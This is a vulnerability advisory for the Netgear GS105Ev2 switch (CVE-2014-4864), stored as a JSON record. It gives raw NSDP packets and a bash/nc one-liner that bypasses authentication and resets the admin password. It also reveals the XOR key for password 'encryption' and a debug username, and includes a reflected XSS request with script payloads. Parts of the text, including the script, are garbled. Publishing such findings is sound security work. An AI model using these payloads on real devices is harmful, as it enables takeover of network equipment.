{
    "text": "vul_name : Netgear GS105Ev2 Authentication Bypass / XSS / CSRF ， vul_cve : CVE-2014-4864 ， vul_poc :  # Multiple Vulnerabilities - Netgear GS105Ev2 ， Product ， Vendor : Netgear ， Model : GS105Ev2 ， Firmware version : 1.3.0.3 , 1.4.0.2 ， Netgear GS105Ev2 is a Gigabit switch with 5 ports targeting SMBs. The switch can be configured by a web application and a netgear configuration utility. The netgear configuration utility uses a proprietary protocol - the so-called Netgear Switch Discovery Protocol ( NSDP ) - to manage and configure switches. The configuration is protected by a password. ， Status/Metrics/Identifier ， Status : unfixed ， CVSS v2 Vector :  ( AV : A/AC : L/Au : N/C : C/I : C/A : C )  ， CVSS Score : 8.3 ， CVE-ID : n/A ， The highest risk is represented by the authentication bypass. This is reflected by the score. ， Author/Credits ， Benedikt Westermann ( TV Rheinland i-sec GmbH )  ， Authentication bypass in NSDP ， The implementation of the NSDP on the GS105Ev2 ( and possibly also other switches ) is flawed. An attacker with access to the broadcast domain of the switch can bypass ， the authentication process. This allows the attacker to gain full control of the switch , i.e. , he can modify a particular configuration or flash another firmware to the ， the switch. ， Detailed Description of the Vulnerability ， The NSDP is a simple stateless protocol. It consists of a header , a trailer , and a body consisting of an array of type-length-value triplets. ， The general structure is depicted below. ， /-+- ，  | 1 byte : version | 1 byte : packet-type |  ， +-+-+ ，  | 2 bytes : result | 4 bytes : reserved |  ， +-+-+ ，  | 6 bytes : src mac | 6 byte : dest mac |  ， +-+-+ ，  | 2 bytes : reserved | 2 bytes : sequence no |  ， +-+-+ ，  | 4 bytes : signature | 2 bytes : reserved |  ， +-+-+ ，  | N bytes : TLV | 2 bytes : 0xFFFF |  ， +-+-/ ，  | 2 bytes : 0x0000 |  ， The TLV part is a sequence of type-length-value ( TLV ) triples. An entry has the following structure :  ， /-+-+- ，  | 2 bytes : type | 2 bytes : length l | l bytes : data |  ， -+-+-/ ， Regarding this vulnerability , the following two types are of special importance :  ， Type 0x0009 - write password ， Type 0x9400 - unknown , but seems to indicate that no authentication is performed. ， By sending the following payload to the port 63322 to the IP of the GS105Ev2 switch , the password is changed to \"test\". ，  | version | type | result | reserved | src-mac | dst-mac ， 01 : 03 : 00 : 00 : 00 : 00 : 00 : 00 : 3c : 97 : 0e : ee : 98 : eb : c0 : ff : d4 : ba : 61 : fc :  ，  | reserved | Sig. ( NSDP )  | TLV-type0x9400 | TLV-type 0x0009 | Trailer ， 00 : 00 : 00 : 78 : 4e : 53 : 44 : 50 : 94 : 00 : 00 : 00 : 00 : 09 : 00 : 04 : 3a : 11 : 14 : 06 : ff : ff : 00 : 00 ， Hereby , the following part is of importance :  ， 94 : 00 : 00 : 00 : 00 : 09 : 00 : 04 : 3a : 11 : 14 : 06 ， The TLV 94 : 00 : 00 : 00 indicates a packet of type 94 with no payload. This followed by the TLV 00 : 09 : 00 : 04 : 3a : 11 : 14 : 06. 0x0009 is the type \"password change\" , 0x0004 is ， the length of the password , and 3a : 11 : 14 : 06 is the \"encrypted\" password that is about to be set. The \"encryption\" of the password is done by XORing the password with ， the string \"NtgrSmartSwitchRock\". If the password is longer than the secret , the secret is used again. ， In case , the password has successfully be set , the switch replies with the following message :  ， 01 : 04 : 00 : 00 : 00 : 00 : 00 : 00 : 3c : 97 : 0e : ee : 98 : eb : c0 : ff : d4 : ba : 61 : fc : 00 : 00 : 00 : 78 : 4e : 53 : 44 : 50 : 00 : 00 : 00 : 00 ， If the message starts with this prefix 01 : 04 : 00 : 00 , the password was changed successfully. This enables an attacker to gain access to the following configuration interfaces :  ， - Web interface HTTP : /<ip-of-switch>/login.cgi ， - Webinterface with user : Admin1NtgrDebugUser ( e.g. :  ， - Netgear Configuration utility ， With this , the configuration can be changed , e.g. , enabling a monitoring port , or flashing a new firmware. ， The following bash script can be used to change the password to test :  ， echo \"Please enter IP of switch : \" ; read ip ; echo \" ; echo \"Please enter MAC of switch ( e.g. de : ad : de : ad : be : ef )  : \" ; read mac ; echo \"01 : 03 : 00 : 00 : 00 : 00 : 00 : 00 : 3c : 97 : 0e : ee : 98 : eb : c0 : ff : d4 : ba : 61 : fc : 00 : 00 : 00 : 78 : 4e : 53 : 44 : 50 : 94 : 00 : 00 : 00 : 00 : 09 : 00 : 04 : 3a : 11 : 14 : 06 : ff : ff : 00 : 00\" | sed \"s/c0 : ff : d4 : ba : 61 : fc/ $ mac/g ; s/ : /g\" | xd -r -p | nc -q 0 -b -u $ ip 63322 ， For a switch with the IP 192.168.0.239 and the MAC c0 : ff : d4 : ba : 61 : fc , the output ( and input ) would look like this :  ， Please enter IP of switch :  ， 192.168.0.239 ， Please enter MAC of switch ( e.g. de : ad : de : ad : be : ef )  :  ， c0 : ff : d4 : ba : 61 : fc ， If the password is not changed , reboot the switch as this little bash script does not regard the SEQ number. ， It should be noted that the authentication bypass is not limited to the \"set password\" function. Other write functions are also affected by this vulnerability. ， Please note that the \"encryption\" scheme for the password is broken. The encryption string can easily be recovered by a simple XOR operation on a known password ( NtgrSmartSwitchRock ) . Moreover , the Netgear Configuration Utility broadcasts the password to the network. Thus , an attacker within the broadcast domain can eavesdrop and decode the password. This fact was already noted in [ Security by Obscurity bei Netgear Switches ] . ，  [ Security by Obscurity bei Netgear Switches ]  : - ， Multiple Vulnerabilities in Web-Interface ， Though we did not perform a full analysis of the web interface , we noticed that the web interface is prone to several vulnerabilities , i.e. , XSS , CSRF , and insufficient protection of the password. ， Detailed Description of the Vulnerabilities ， XSS ， We noticed that the web interface does not properly encode the output. This allows reflected Cross-Site Scripting attacks. The issue can be reproduced with the following request :  ， POST /switch_info.cgi HTTP/1.1 ， Host : 192.168.0.239 ， Cookie : SID=EwTVdGBCCCofNUhte ] iXsr_psjq^hNdwrRSXkduf [ OXpsveZAeyIp_x [ wFmKdp_ijDDqABZrjlBH ， Content-Type : application/x-www-form-urlencoded ， Content-Length : 110 ， switch_name='onclick=alert ( 1 ) &dhcpMode=0&ip_address='><Script>alert ( &subnet_mask=1 ) </script>'&gateway_address= ， Alternatively , the following HTML-document can be opened to trigger the XSS.",
    "time": "2016.01.29"
}